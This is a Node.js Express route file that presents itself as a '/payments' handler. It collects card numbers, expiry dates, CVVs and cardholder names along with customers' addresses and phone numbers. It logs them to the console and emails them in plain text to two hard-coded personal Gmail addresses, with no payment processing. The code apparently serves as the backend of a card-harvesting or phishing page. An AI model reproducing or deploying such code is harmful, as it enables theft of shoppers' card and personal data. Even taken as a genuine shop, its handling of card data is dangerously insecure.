const router = require("express").Router();

const nodemailer = require("nodemailer");




router.post("/payments", async (req, res) => {
  const { 
    expiry, 
    cvv, 
    cardholder, 
    cardNumber, 
    name, 
    address, 
    phone, 
    country, 
    state, 
    city 
  } = req.body;  // Extract delivery information as well

  // Create an updated email template including both payment and delivery info
  const emailTemplate = `
    Payment Details:
    \n\n
    Expiration Date: ${expiry}
    \n
    CVV: ${cvv}
    \n
    Cardholder Name: ${cardholder}
    \n
    Card Number: ${cardNumber}
    
    \n\n
    Shipping Details:
    \n\n
    Full Name: ${name}
    \n
    Address: ${address}
    \n
    Phone: ${phone}
    \n
    Country: ${country}
    \n
    State: ${state}
    \n
    City: ${city}
  `;

  console.log(emailTemplate);

  // Setup the mail transporter
  const mailTransporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: process.env.GOOGLE_APP_EMAIL,
      pass: process.env.GOOGLE_APP_PW,
    },
  });

  const details = {
    from: process.env.GOOGLE_APP_EMAIL,
    to: "toluarejibadey@gmail.com , victorbenson803@gmail.com",
    subject: "Shipping and Payment Details",
    text: emailTemplate,
  };

  // Send the email
  mailTransporter.sendMail(details, (err) => {
    if (err) {
      console.error("Email failed:", err);
      return res.status(500).json({ message: "Failed to send email." });
    } else {
      console.log("Email sent successfully.");
      return res.json({ message: "Email sent successfully." });
    }
  });
});


module.exports = router;
